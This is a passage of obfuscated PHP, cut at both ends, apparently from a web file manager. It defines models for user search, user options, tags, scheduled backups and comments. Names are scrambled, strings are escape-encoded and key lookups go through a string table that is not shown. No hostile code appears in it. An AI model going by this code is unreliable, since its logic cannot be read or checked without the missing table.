$ãº‚˜íÕ[233]); if (_get($¹ÙÀ”‘ƒ, $ãº‚˜íÕ[821], !1)) { $ŒÕş£Â™[$¡ı €É] = array($ãº‚˜íÕ[2252], $¹ÙÀ”‘ƒ[$ãº‚˜íÕ[821]]); } if (_get($¹ÙÀ”‘ƒ, $ãº‚˜íÕ[822], !1)) { $ÈÆœ†ä = array($ãº‚˜íÕ[2253], $¹ÙÀ”‘ƒ[$ãº‚˜íÕ[822]]); if ($ŒÕş£Â™[$¡ı €É]) { $ŒÕş£Â™[$¡ı €É] = array($ŒÕş£Â™[$¡ı €É], $ÈÆœ†ä, $ãº‚˜íÕ[2254]); } else { $ŒÕş£Â™[$¡ı €É] = $ÈÆœ†ä; } } $ÀØõñğğ = $this->_makeOrder($şÏ®ËÊ­)->field($ãº‚˜íÕ[2507])->where($ŒÕş£Â™)->join($•‰‡”Èã)->selectPage(50); $this->_listDataApply($ÀØõñğğ[$ãº‚˜íÕ[447]]); return $ÀØõñğğ; } private function _makeOrder($Şñá–Ü³ = '') { $Ùîüû•ü =& $_SERVER[°‰†òö¯]; $µšÇİÌÚ = array($Ùîüû•ü[1771], $Ùîüû•ü[32], $Ùîüû•ü[1960], $Ùîüû•ü[2182], $Ùîüû•ü[1932], $Ùîüû•ü[233]); $„°¨Ë©õ = array($Ùîüû•ü[525] => $Ùîüû•ü[526], $Ùîüû•ü[527] => $Ùîüû•ü[528]); $“€òéøÛ = Input::get($Ùîüû•ü[532], $Ùîüû•ü[7], $Ùîüû•ü[1762], $µšÇİÌÚ); $³ñòª°Õ = Input::get($Ùîüû•ü[533], $Ùîüû•ü[7], $Ùîüû•ü[2067], array($Ùîüû•ü[2067], $Ùîüû•ü[527])); $³ñòª°Õ = $„°¨Ë©õ[$³ñòª°Õ]; $Şñá–Ü³ = $Şñá–Ü³ . "\x75\163\145\x72\x2e{$“€òéøÛ}\40{$³ñòª°Õ}\54\40\x75\x73\x65\x72\56\165\163\x65\x72\x49\104\x20\x61\x73\x63"; return $this->alias($Ùîüû•ü[2198])->order($Şñá–Ü³); } public function listSearch($ÂêŒ‘Ìà) { $æŒÊì™— =& $_SERVER[°‰†òö¯]; $ÌÒÈŠÃ· = trim($ÂêŒ‘Ìà[$æŒÊì™—[2070]]); $Àæ¡Ò¤ö = explode($æŒÊì™—[53], $ÌÒÈŠÃ·); if (!$ÌÒÈŠÃ· || count($Àæ¡Ò¤ö) == 1) { return $this->listSearchNow($ÂêŒ‘Ìà); } $Ñ¸ ´ëĞ = array($æŒÊì™—[447] => array()); foreach ($Àæ¡Ò¤ö as $À™šÓÅö) { if (!trim($À™šÓÅö)) { continue; } $ÂêŒ‘Ìà[$æŒÊì™—[2070]] = $À™šÓÅö; $¸¥İÎÜÉ = $this->listSearchNow($ÂêŒ‘Ìà); $Ñ¸ ´ëĞ[$æŒÊì™—[447]] = array_merge($Ñ¸ ´ëĞ[$æŒÊì™—[447]], $¸¥İÎÜÉ[$æŒÊì™—[447]]); } $Ñ¸ ´ëĞ[$æŒÊì™—[447]] = array_unique_by_key($Ñ¸ ´ëĞ[$æŒÊì™—[447]], $æŒÊì™—[1771]); $Ñ¸ ´ëĞ[$æŒÊì™—[444]] = array($æŒÊì™—[445] => count($Ñ¸ ´ëĞ[$æŒÊì™—[447]]), $æŒÊì™—[441] => 20, $æŒÊì™—[430] => 1, $æŒÊì™—[446] => 1); return $Ñ¸ ´ëĞ; } public function listSearchNow($•¡’Åü†) { $«ú¼ö˜ö =& $_SERVER[°‰†òö¯]; $Äµ©Óçµ = trim($•¡’Åü†[$«ú¼ö˜ö[2070]]); $€ŒÂş»÷ = isset($•¡’Åü†[$«ú¼ö˜ö[2071]]) ? $•¡’Åü†[$«ú¼ö˜ö[2071]] : !1; $Äµ©Óçµ = str_replace($«ú¼ö˜ö[2072], $«ú¼ö˜ö[2073], trim($Äµ©Óçµ)); $ÓÈéÛ«Ñ = array($«ú¼ö˜ö[32] => array($«ú¼ö˜ö[461], "\x25{$Äµ©Óçµ}\x25"), $«ú¼ö˜ö[382] => array($«ú¼ö˜ö[461], "{$Äµ©Óçµ}\45"), $«ú¼ö˜ö[2271] => array($«ú¼ö˜ö[461], "{$Äµ©Óçµ}\x25"), $«ú¼ö˜ö[1075] => $«ú¼ö˜ö[2074]); if (Input::check($Äµ©Óçµ, $«ú¼ö˜ö[388])) { $ÓÈéÛ«Ñ[$«ú¼ö˜ö[1771]] = array($«ú¼ö˜ö[461], "{$Äµ©Óçµ}\45"); $ÓÈéÛ«Ñ[$«ú¼ö˜ö[2488]] = array($«ú¼ö˜ö[461], "{$Äµ©Óçµ}\x25"); } if (!$Äµ©Óçµ) { $ÓÈéÛ«Ñ = array(); } if (isset($•¡’Åü†[$«ú¼ö˜ö[811]])) { $ÓÈéÛ«Ñ[$«ú¼ö˜ö[811]] = $•¡’Åü†[$«ú¼ö˜ö[811]]; } $ÓÈéÛ«Ñ = $this->parseWhereLike($ÓÈéÛ«Ñ); $™ê¦–ŠÌ = $this->_makeOrder()->where($ÓÈéÛ«Ñ)->selectPage(20); if (!$™ê¦–ŠÌ || count($™ê¦–ŠÌ[$«ú¼ö˜ö[447]]) < 5 && Input::check($Äµ©Óçµ, $«ú¼ö˜ö[395])) { $äÕ„‚Çç = $this->_searchFromMeta($«ú¼ö˜ö[539], $Äµ©Óçµ, 10); $ÄØÉ§’ = $this->_searchFromMeta($«ú¼ö˜ö[540], $Äµ©Óçµ, 10); $ØÉ¡ùÆ³ = array_merge($äÕ„‚Çç, $ÄØÉ§’, $™ê¦–ŠÌ[$«ú¼ö˜ö[447]]); $™ê¦–ŠÌ[$«ú¼ö˜ö[447]] = array_unique_by_key($ØÉ¡ùÆ³, $«ú¼ö˜ö[1771]); $™ê¦–ŠÌ[$«ú¼ö˜ö[444]][$«ú¼ö˜ö[445]] = count($™ê¦–ŠÌ[$«ú¼ö˜ö[447]]); $™ê¦–ŠÌ[$«ú¼ö˜ö[444]][$«ú¼ö˜ö[446]] = ceil($™ê¦–ŠÌ[$«ú¼ö˜ö[444]][$«ú¼ö˜ö[445]] / $™ê¦–ŠÌ[$«ú¼ö˜ö[444]][$«ú¼ö˜ö[441]]); } $this->_listDataApply($™ê¦–ŠÌ[$«ú¼ö˜ö[447]]); $this->_filterByGroup($™ê¦–ŠÌ, $€ŒÂş»÷); return $™ê¦–ŠÌ; } private function _filterByGroup(&$¤Õ“ÈŒ, $éÉ‰³‰) { $”ŒÙƒ¯Ñ =& $_SERVER[°‰†òö¯]; if (!$éÉ‰³‰) { return $¤Õ“ÈŒ; } foreach ($¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[447]] as $ô²”š => &$¨ì™®ÓÁ) { $¼ĞÚ€Ñƒ = array_to_keyvalue($¨ì™®ÓÁ[$”ŒÙƒ¯Ñ[2167]], $”ŒÙƒ¯Ñ[12], $”ŒÙƒ¯Ñ[1972]); if (!in_array($éÉ‰³‰, $¼ĞÚ€Ñƒ)) { unset($¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[447]][$ô²”š]); } } unset($¨ì™®ÓÁ); $¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[447]] = array_values($¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[447]]); $¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[444]] = array($”ŒÙƒ¯Ñ[2235] => count($¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[447]]), $”ŒÙƒ¯Ñ[2233] => $¤Õ“ÈŒ[$”ŒÙƒ¯Ñ[444]][$”ŒÙƒ¯Ñ[441]], $”ŒÙƒ¯Ñ[2232] => 1, $”ŒÙƒ¯Ñ[2234] => 1); } private function _searchFromMeta($Âû½ñ‚Ú, $¼ãäß©Õ, $İã‰ßàÁ) { $®£ÉÄòÕ =& $_SERVER[°‰†òö¯]; $¼ãäß©Õ = strtolower($¼ãäß©Õ); $ùåÃåî¯ = array($®£ÉÄòÕ[97] => $Âû½ñ‚Ú, $®£ÉÄòÕ[452] => array($®£ÉÄòÕ[461], "\x25{$¼ãäß©Õ}\x25")); $ùåÃåî¯ = $this->parseWhereLike($ùåÃåî¯); $äı„›ïå = Model($®£ÉÄòÕ[2508])->where($ùåÃåî¯)->limit($İã‰ßàÁ)->select(); if (!$äı„›ïå) { return array(); } $äı„›ïå = array_to_keyvalue($äı„›ïå, $®£ÉÄòÕ[12], $®£ÉÄòÕ[1771]); $ñˆ…É¼“ = $this->where(array($®£ÉÄòÕ[1762] => array($®£ÉÄòÕ[7], $äı„›ïå)))->select(); if (!$ñˆ…É¼“) { return array(); } return $ñˆ…É¼“; } private function _listDataApplyItem($Ë°¼ÏÓã) { $×‘ğ¬†æ = array($Ë°¼ÏÓã); $this->_listDataApply($×‘ğ¬†æ); return $×‘ğ¬†æ[0]; } private function _listDataApply(&$èÔÙü) { $Óé”®Óó =& $_SERVER[°‰†òö¯]; if (!$èÔÙü) { return; } array_remove_key($èÔÙü, $Óé”®Óó[962]); $’®ƒÏã» = array_to_keyvalue($èÔÙü, $Óé”®Óó[12], $Óé”®Óó[1771]); $this->_listAppendGroup($èÔÙü, $’®ƒÏã»); $this->_listAppendMeta($èÔÙü, $’®ƒÏã»); $this->_listAppendSourceRoot($èÔÙü, $’®ƒÏã»); } private function _listAppendSourceRoot(&$øóáÊ©, $ªüå‹Ãè) { $áÎ‚Ì‚£ =& $_SERVER[°‰†òö¯]; $ÛÕ¸Ü•æ = Model($áÎ‚Ì‚£[891])->listSourceRoot(SourceModel::TYPE_USER, $ªüå‹Ãè); $ÛÕ¸Ü•æ = array_to_keyvalue($ÛÕ¸Ü•æ, $áÎ‚Ì‚£[573]); $ÛÕ¸Ü•æ = array_remove_key($ÛÕ¸Ü•æ, $áÎ‚Ì‚£[573]); foreach ($øóáÊ© as &$ßàÉé€¸) { $ßàÉé€¸[$áÎ‚Ì‚£[90]] = $ÛÕ¸Ü•æ[$ßàÉé€¸[$áÎ‚Ì‚£[1771]]] ? $ÛÕ¸Ü•æ[$ßàÉé€¸[$áÎ‚Ì‚£[1771]]] : array(); } unset($ßàÉé€¸); } private function _listAppendGroup(&$‚ßé‚§ú, $¯ŞşìÒ¶) { $¸‹ôÃ‹¡ =& $_SERVER[°‰†òö¯]; $ƒÎ„óÊ© = array($¸‹ôÃ‹¡[1771] => array($¸‹ôÃ‹¡[7], $¯ŞşìÒ¶)); $ñã¹ğ›„ = Model($¸‹ôÃ‹¡[2066])->where($ƒÎ„óÊ©)->select(); $¦‹áÕ¯ş = array_to_keyvalue($ñã¹ğ›„, $¸‹ôÃ‹¡[12], $¸‹ôÃ‹¡[1972]); $¦‹áÕ¯ş = array_remove_value(array_unique($¦‹áÕ¯ş), $¸‹ôÃ‹¡[230]); if (!$¦‹áÕ¯ş || !$ñã¹ğ›„) { return; } $ƒÎ„óÊ© = array($¸‹ôÃ‹¡[1972] => array($¸‹ôÃ‹¡[7], $¦‹áÕ¯ş)); $®³Û•‘ = Model($¸‹ôÃ‹¡[2165])->field($¸‹ôÃ‹¡[2509])->where($ƒÎ„óÊ©)->select(); $®³Û•‘ = array_to_keyvalue($®³Û•‘, $¸‹ôÃ‹¡[1972]); $ñã¹ğ›„ = array_to_keyvalue_group($ñã¹ğ›„, $¸‹ôÃ‹¡[1771]); foreach ($ñã¹ğ›„ as &$°áîÙŸ ) { $¼“Ãä¯ã = array(); foreach ($°áîÙŸ  as $ÂÁ¯×øò) { if (!$ÂÁ¯×øò[$¸‹ôÃ‹¡[2080]]) { continue; } $Ç±ì‘­÷ = Model($¸‹ôÃ‹¡[575])->listData($ÂÁ¯×øò[$¸‹ôÃ‹¡[2080]]); $¼“Ãä¯ã[] = array($¸‹ôÃ‹¡[1972] => $ÂÁ¯×øò[$¸‹ôÃ‹¡[1972]], $¸‹ôÃ‹¡[2510] => $®³Û•‘[$ÂÁ¯×øò[$¸‹ôÃ‹¡[1972]]][$¸‹ôÃ‹¡[32]], $¸‹ôÃ‹¡[588] => $®³Û•‘[$ÂÁ¯×øò[$¸‹ôÃ‹¡[1972]]][$¸‹ôÃ‹¡[588]], $¸‹ôÃ‹¡[489] => $Ç±ì‘­÷); } $°áîÙŸ  = $¼“Ãä¯ã; } unset($°áîÙŸ ); foreach ($‚ßé‚§ú as &$ÁÆå¤Õ³) { $ÁÆå¤Õ³[$¸‹ôÃ‹¡[2167]] = array(); if (isset($ñã¹ğ›„[$ÁÆå¤Õ³[$¸‹ôÃ‹¡[1771]]])) { $ÁÆå¤Õ³[$¸‹ôÃ‹¡[2167]] = $ñã¹ğ›„[$ÁÆå¤Õ³[$¸‹ôÃ‹¡[1771]]]; } } unset($ÁÆå¤Õ³); } public function userAppendGroup($£™¹‘·¦) { $ÕæûıË =& $_SERVER[°‰†òö¯]; if (!$£™¹‘·¦) { return array(); } $this->_listAppendGroup($£™¹‘·¦, array_to_keyvalue($£™¹‘·¦, $ÕæûıË[12], $ÕæûıË[1771])); return $£™¹‘·¦; } private function _listAppendMeta(&$îş¦¡Ë, $ª®Îµƒ) { $ÑÓ†¡Ş“ =& $_SERVER[°‰†òö¯]; $€¼ÕÓÄö = UserJobModel::JOB_KEY; $íÈûİİ€ = array($ÑÓ†¡Ş“[2489]); $¹¯‚·å— = array($ÑÓ†¡Ş“[1771] => array($ÑÓ†¡Ş“[7], $ª®Îµƒ)); $ÂúñØ = Model($ÑÓ†¡Ş“[2487])->where($¹¯‚·å—)->select(); $ÂúñØ = array_to_keyvalue_group($ÂúñØ, $ÑÓ†¡Ş“[1771]); foreach ($ÂúñØ as &$øÏâêÌ°) { $Š³·Ùª´ = array(); foreach ($øÏâêÌ° as $Æ¯óÓãƒ) { if (!in_array($Æ¯óÓãƒ[$ÑÓ†¡Ş“[97]], $íÈûİİ€)) { $Š³·Ùª´[$Æ¯óÓãƒ[$ÑÓ†¡Ş“[97]]] = $Æ¯óÓãƒ[$ÑÓ†¡Ş“[452]]; } } $øÏâêÌ° = $Š³·Ùª´; } unset($øÏâêÌ°); $«›¤ç«© = Model($ÑÓ†¡Ş“[2511]); foreach ($îş¦¡Ë as &$ù¼ËïÕé) { $Ğòì¿ = array(); if (isset($ÂúñØ[$ù¼ËïÕé[$ÑÓ†¡Ş“[1771]]])) { $Ğòì¿ = $ÂúñØ[$ù¼ËïÕé[$ÑÓ†¡Ş“[1771]]]; } $ù¼ËïÕé[$ÑÓ†¡Ş“[2512]] = array(); if (isset($Ğòì¿[$€¼ÕÓÄö])) { $ù¼ËïÕé[$ÑÓ†¡Ş“[2512]] = $«›¤ç«©->getUserJobInfo($Ğòì¿[$€¼ÕÓÄö]); } } unset($ù¼ËïÕé); } protected function groupUserAll($œµ£à) { $½œ¯–ÓÏ =& $_SERVER[°‰†òö¯]; if (!$œµ£à) { return !1; } $‚–öÛÊ¦ = Model($½œ¯–ÓÏ[2066])->field($½œ¯–ÓÏ[1771])->where(array($½œ¯–ÓÏ[1972] => array($½œ¯–ÓÏ[7], $œµ£à)))->select(); $‚–öÛÊ¦ = array_to_keyvalue($‚–öÛÊ¦, $½œ¯–ÓÏ[12], $½œ¯–ÓÏ[1771]); return array_unique($‚–öÛÊ¦); } public function userSearch($ÆßÔôÇ, $¦¯Éš’î = "\52") { return Model($_SERVER[°‰†òö¯][601])->where($ÆßÔôÇ)->field($¦¯Éš’î)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Øª„òäº) { $À²ºÃµÀ =& $_SERVER[°‰†òö¯]; $İ“Ÿù™• = defined($À²ºÃµÀ[2202]) && USER_ID ? USER_ID : $À²ºÃµÀ[12]; return "\125\x73\145\x72\117\160\x74\151\157\156\137{$Øª„òäº}\x5f" . $İ“Ÿù™•; } protected function filterWhere($ÑøĞ‚Ÿ¡) { $—İŸ©ô =& $_SERVER[°‰†òö¯]; $ÑøĞ‚Ÿ¡[$—İŸ©ô[1771]] = defined($—İŸ©ô[2202]) && USER_ID ? USER_ID : $—İŸ©ô[12]; return $ÑøĞ‚Ÿ¡; } public function cacheRemoveUser($ÚéÖ£¹ò, $«ÕíøÉÇ) { return Cache::remove("\x55\x73\145\x72\117\160\164\x69\157\x6e\137{$ÚéÖ£¹ò}\x5f" . $«ÕíøÉÇ); } protected function optionDefault($õÈÕª•ü = '') { $¸Í½íÛÒ =& $_SERVER[°‰†òö¯]; if ($õÈÕª•ü == $¸Í½íÛÒ[12]) { return $GLOBALS[$¸Í½íÛÒ[6]][$¸Í½íÛÒ[2513]]; } if ($õÈÕª•ü == $¸Í½íÛÒ[2514]) { return $GLOBALS[$¸Í½íÛÒ[6]][$¸Í½íÛÒ[2515]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\x74\141\147\114\151\163\164"; public $modelType = "\x55\163\x65\162\x4f\160\x74\151\157\156"; public $field = array("\156\x61\x6d\x65", "\x73\x74\x79\x6c\x65", "\x73\157\162\x74"); public function listData($Ç‹²°Àü = false, $Ë° å‹Û = "\163\x6f\162\164", $«¾—ü¶ = false) { return parent::listData($Ç‹²°Àü, $Ë° å‹Û, $«¾—ü¶); } public function remove($ åòŠàù) { return parent::remove($ åòŠàù); } public function add($ñ¯ÅÏÌ, $Ë²ô²Õƒ = "\154\x61\x62\x65\x6c\55\147\162\x65\171\x2d\x6e\x6f\162\155\141\154") { $è¨¶¯®Ñ =& $_SERVER[°‰†òö¯]; if ($this->findByName($ñ¯ÅÏÌ)) { return !1; } $˜•¨¹ç“ = array($è¨¶¯®Ñ[496] => $ñ¯ÅÏÌ, $è¨¶¯®Ñ[562] => $Ë²ô²Õƒ, $è¨¶¯®Ñ[1976] => $this->getSort($è¨¶¯®Ñ[337]) + 1); return parent::insert($˜•¨¹ç“); } public function update($ Í„–“­, $Á”ÎŠí) { $²—ãĞ  =& $_SERVER[°‰†òö¯]; $ÍŒí¥ˆ¢ = $this->listData($ Í„–“­); $¤ÅöÙÒ = $this->findByName($Á”ÎŠí[$²—ãĞ [32]]); if (!$ÍŒí¥ˆ¢ || $¤ÅöÙÒ && $¤ÅöÙÒ[$²—ãĞ [477]] != $ÍŒí¥ˆ¢[$²—ãĞ [477]]) { return !1; } return parent::update($ Í„–“­, $Á”ÎŠí); } public function moveTop($¯¥©¹¦é) { $Ğˆøî³† =& $_SERVER[°‰†òö¯]; $ú²ÑŞŒÆ = parent::listData(); $ã°ı£¡É = $this->getSort($Ğˆøî³†[336]); foreach ($ú²ÑŞŒÆ as &$ñƒ§•úß) { if ($ñƒ§•úß[$Ğˆøî³†[477]] == $¯¥©¹¦é) { $ñƒ§•úß[$Ğˆøî³†[1996]] = $ã°ı£¡É; continue; } $ñƒ§•úß[$Ğˆøî³†[1996]] += 1; } unset($ñƒ§•úß); return parent::resetData($ú²ÑŞŒÆ); } public function moveBottom($¤Š­Ò) { $Ùìüçø =& $_SERVER[°‰†òö¯]; $ø˜ó‚Áâ = $this->getSort($Ùìüçø[337]) + 1; return parent::update($¤Š­Ò, array($Ùìüçø[1996] => $ø˜ó‚Áâ)); } public function resetSort($¡Ğî¦) { $Ÿ ıœ¸ =& $_SERVER[°‰†òö¯]; $›Ó¾ÆÂş = array(); $¡Ğî¦ = is_array($¡Ğî¦) ? $¡Ğî¦ : array(); for ($¤®ôÔáŠ = 0; $¤®ôÔáŠ < count($¡Ğî¦); $¤®ôÔáŠ++) { $›Ó¾ÆÂş[$¡Ğî¦[$¤®ôÔáŠ] . $Ÿ ıœ¸[12]] = $¤®ôÔáŠ + 1; } $ŸØèàÛ = parent::listData(); foreach ($ŸØèàÛ as &$ıÍí™ù‘) { $»†ä»¬ğ = $›Ó¾ÆÂş[$ıÍí™ù‘[$Ÿ ıœ¸[477]]]; $ıÍí™ù‘[$Ÿ ıœ¸[1996]] = $»†ä»¬ğ ? $»†ä»¬ğ : $ıÍí™ù‘[$Ÿ ıœ¸[1996]]; } unset($ıÍí™ù‘); return parent::resetData($ŸØèàÛ); } private function getSort($»Šñší) { $œŒÚ‡¥ñ =& $_SERVER[°‰†òö¯]; $İ¹°»âÂ = parent::listData(); $ÉÏ“Õúª = array_to_keyvalue($İ¹°»âÂ, $œŒÚ‡¥ñ[12], $œŒÚ‡¥ñ[1996]); if (!$ÉÏ“Õúª) { $ÉÏ“Õúª = array(0); } $ ÕñÖ¸ = $»Šñší == $œŒÚ‡¥ñ[337] ? max($ÉÏ“Õúª) : min($ÉÏ“Õúª); return intval($ ÕñÖ¸); } } goto BÇ­î§£³Ì; C‚Œ˜÷Á¶Í: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x62\x61\143\x6b\x75\160\114\151\163\164"; public $field = array("\151\157", "\x6e\141\x6d\145", "\163\x74\x61\x74\x75\x73", "\x63\x6f\x6e\x74\145\x6e\164", "\155\141\156\x75\x61\x6c", "\x72\x65\x73\165\154\x74", "\164\151\x6d\x65\106\162\157\x6d", "\164\x69\155\x65\x54\157"); public function config() { $÷™¯ÄŒÙ =& $_SERVER[°‰†òö¯]; Action($÷™¯ÄŒÙ[1997])->taskInit(); $Ü»îİğÏ = Model($÷™¯ÄŒÙ[831])->get($÷™¯ÄŒÙ[838]); $Ü»îİğÏ = json_decode($Ü»îİğÏ, !0); $Ü»îİğÏ = is_array($Ü»îİğÏ) ? $Ü»îİğÏ : array(); $this->parseContent($Ü»îİğÏ); unset($Ü»îİğÏ[$÷™¯ÄŒÙ[1740]]); Model($÷™¯ÄŒÙ[1739])->cacheClear(); $›ì»ææ’ = $÷™¯ÄŒÙ[1998]; $½±ë£í´ = Model($÷™¯ÄŒÙ[1999])->findByKey($÷™¯ÄŒÙ[1758], $›ì»ææ’); if (!$½±ë£í´) { $½±ë£í´ = array(); } if (isset($½±ë£í´[$÷™¯ÄŒÙ[206]])) { $½±ë£í´[$÷™¯ÄŒÙ[206]] = json_decode($½±ë£í´[$÷™¯ÄŒÙ[206]], !0); } if (isset($Ü»îİğÏ[$÷™¯ÄŒÙ[206]])) { $½±ë£í´[$÷™¯ÄŒÙ[206]][$÷™¯ÄŒÙ[1743]] = $Ü»îİğÏ[$÷™¯ÄŒÙ[206]]; unset($Ü»îİğÏ[$÷™¯ÄŒÙ[206]]); } return array_merge($½±ë£í´, $Ü»îİğÏ); } public function listData($Ş©Õ©êá = false, $‹õ©÷–ë = "\155\x6f\144\151\x66\x79\x54\x69\x6d\145", $Ç±’¥¼Ò = false) { $î¢Œ§ì = parent::listData($Ş©Õ©êá, $‹õ©÷–ë, !0); if (!$î¢Œ§ì) { return $î¢Œ§ì; } if ($Ş©Õ©êá) { $î¢Œ§ì = array($î¢Œ§ì); } foreach ($î¢Œ§ì as &$–ö…ùñ) { $this->parseContent($–ö…ùñ); } return $Ş©Õ©êá ? $î¢Œ§ì[0] : $î¢Œ§ì; } public function parseContent(&$¼Ò¿ë£) { $Òç£“ØŠ =& $_SERVER[°‰†òö¯]; $Ğ´¤Ïš¾ = _get($¼Ò¿ë£, $Òç£“ØŠ[171], $Òç£“ØŠ[91]); if (!in_array($Ğ´¤Ïš¾, array($Òç£“ØŠ[837], $Òç£“ØŠ[1207]))) { $¼Ò¿ë£[$Òç£“ØŠ[171]] = $Ğ´¤Ïš¾ == $Òç£“ØŠ[91] ? $Òç£“ØŠ[1207] : $Òç£“ØŠ[837]; } } public function lastItem() { $Û€‡¸£æ = $this->listData(); return !empty($Û€‡¸£æ[0]) ? $Û€‡¸£æ[0] : null; } public function kill($¶ÚÕ®”£) { $×´è³³õ =& $_SERVER[°‰†òö¯]; $á¤ôŒ¡ = $this->listData($¶ÚÕ®”£); if (!$á¤ôŒ¡ || empty($á¤ôŒ¡[$×´è³³õ[32]])) { return !0; } Task::kill($×´è³³õ[846]); Task::kill($×´è³³õ[865]); Task::kill($×´è³³õ[875]); $¨‡ô¾ø³ = $á¤ôŒ¡[$×´è³³õ[32]]; $âÕ²ßü« = TEMP_FILES . $×´è³³õ[841] . $¨‡ô¾ø³ . $×´è³³õ[8]; IO::remove($âÕ²ßü«, !1); return $this->remove($¶ÚÕ®”£); } public function remove($¨–—ü) { $¦ì•Å§û = $this->listData($¨–—ü); if (!$¦ì•Å§û) { return !0; } return $this->backupRemove($¦ì•Å§û); } private function backupRemove($Ç­ãØµ) { parent::remove($Ç­ãØµ[$_SERVER[°‰†òö¯][477]]); $á±ÊÛßù = $this->backupPath($Ç­ãØµ); IO::remove($á±ÊÛßù, !1); return !0; } private function backupPath($„íüÄ‹ë) { $˜é¸Ä³‚ =& $_SERVER[°‰†òö¯]; $¯Í„¿ = $„íüÄ‹ë[$˜é¸Ä³‚[32]]; $íİÚîñ¼ = Model($˜é¸Ä³‚[831])->get($˜é¸Ä³‚[832]); $µÈû¡ = substr(md5($˜é¸Ä³‚[833] . $íİÚîñ¼ . $¯Í„¿), 0, 8); return "\173\151\157\72{$„íüÄ‹ë[$˜é¸Ä³‚[813]]}\175\x2f\144\141\x74\x61\x62\x61\163\145\57\142\141\x63\153\165\x70\57" . $¯Í„¿ . $˜é¸Ä³‚[11] . $µÈû¡; } public function start() { $É²Ø­ğ¯ =& $_SERVER[°‰†òö¯]; if ($GLOBALS[$É²Ø­ğ¯[6]][$É²Ø­ğ¯[92]][$É²Ø­ğ¯[2000]] != $É²Ø­ğ¯[91]) { return !0; } $ƒúÙáªŒ = $this->config(); if (!$ƒúÙáªŒ || $ƒúÙáªŒ[$É²Ø­ğ¯[1740]] != $É²Ø­ğ¯[91]) { return !1; } if ($ƒúÙáªŒ[$É²Ø­ğ¯[171]] == $É²Ø­ğ¯[837]) { $ã¦ = Model($É²Ø­ğ¯[831])->get($É²Ø­ğ¯[1322]); if ($ã¦ == $É²Ø­ğ¯[1323]) { $ƒúÙáªŒ[$É²Ø­ğ¯[171]] = $É²Ø­ğ¯[1207]; } } $Òµß‰Êˆ = $this->process(); foreach ($Òµß‰Êˆ as $’˜¡½üÇ) { if ($’˜¡½üÇ) { return Task::restart($’˜¡½üÇ[$É²Ø­ğ¯[477]]); } } $Â¤Ûàüè = new Backup(); $„ÒÅšª = $Â¤Ûàüè->db(); if ($„ÒÅšª) { $„ÒÅšª = $Â¤Ûàüè->dbFile(); if ($„ÒÅšª && $ƒúÙáªŒ[$É²Ø­ğ¯[171]] == $É²Ø­ğ¯[837]) { $„ÒÅšª = $Â¤Ûàüè->file(); } } Backup::set(array($É²Ø­ğ¯[811] => 1, $É²Ø­ğ¯[822] => time())); return !0; } public function process() { $¨ÃäïÙ“ =& $_SERVER[°‰†òö¯]; $µÓéÓİÇ = array($¨ÃäïÙ“[818] => Task::get($¨ÃäïÙ“[846]), $¨ÃäïÙ“[823] => Task::get($¨ÃäïÙ“[865]), $¨ÃäïÙ“[232] => Task::get($¨ÃäïÙ“[875])); $Ù§ Á”è = !1; foreach ($µÓéÓİÇ as &$úı‘°ª) { if ($Ù§ Á”è) { $úı‘°ª = !1; continue; } if ($úı‘°ª) { $„µıé = intval(_get($úı‘°ª, $¨ÃäïÙ“[1776], 0)); if (time() - $„µıé > 7200) { Task::kill($úı‘°ª[$¨ÃäïÙ“[477]]); $Ù§ Á”è = !0; $úı‘°ª = !1; } } } return $µÓéÓİÇ; } public function restore() { $Èòò¥…ñ =& $_SERVER[°‰†òö¯]; ActionCall($Èòò¥…ñ[1135], !0, 1); ActionCall($Èòò¥…ñ[1135], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\x6e\164"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\155\145" => "\x63\157\x6d\155\145\x6e\164\x5f\x6d\145\164\x61", "\x6d\145\x74\x61\x46\x69\x65\154\144" => "\143\157\155\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¾¹Í„ß) { $â†Î÷Ğ‰ =& $_SERVER[°‰†òö¯]; if ($¾¹Í„ß[$â†Î÷Ğ‰[2001]]) { $”Æ½Ô¤ = $this->where(array($â†Î÷Ğ‰[2002] => $¾¹Í„ß[$â†Î÷Ğ‰[2001]]))->find(); if (!$”Æ½Ô¤ || $”Æ½Ô¤[$â†Î÷Ğ‰[190]] != $¾¹Í„ß[$â†Î÷Ğ‰[190]] || $”Æ½Ô¤[$â†Î÷Ğ‰[573]] != $¾¹Í„ß[$â†Î÷Ğ‰[573]]) { return !1; } $this->where(array($â†Î÷Ğ‰[2002] => $¾¹Í„ß[$â†Î÷Ğ‰[2001]]))->setAdd($â†Î÷Ğ‰[2003], 1); } $¾¹Í„ß[$â†Î÷Ğ‰[2004]] = 0; $¾¹Í„ß[$â†Î÷Ğ‰[2003]] = 0; $¾¹Í„ß[$â†Î÷Ğ‰[811]] = 1; return $this->add($¾¹Í„ß); } public function commentCount($ÛÅ¸ÙñŸ, $ÊÚ§ØÑÛ, $û›«¿¤ = false) { $èíæÅÎ¸ =& $_SERVER[°‰†òö¯]; if (!$ÛÅ¸ÙñŸ) { return array(); } if (is_string($ÛÅ¸ÙñŸ) || is_int($ÛÅ¸ÙñŸ)) { $ÛÅ¸ÙñŸ = array($ÛÅ¸ÙñŸ); } $÷¼·Èë = array($èíæÅÎ¸[573], $èíæÅÎ¸[2005] => $èíæÅÎ¸[569]); $ÉãÔıÎ = array($èíæÅÎ¸[573] => array($èíæÅÎ¸[7], $ÛÅ¸ÙñŸ), $èíæÅÎ¸[190] => $ÊÚ§ØÑÛ); if 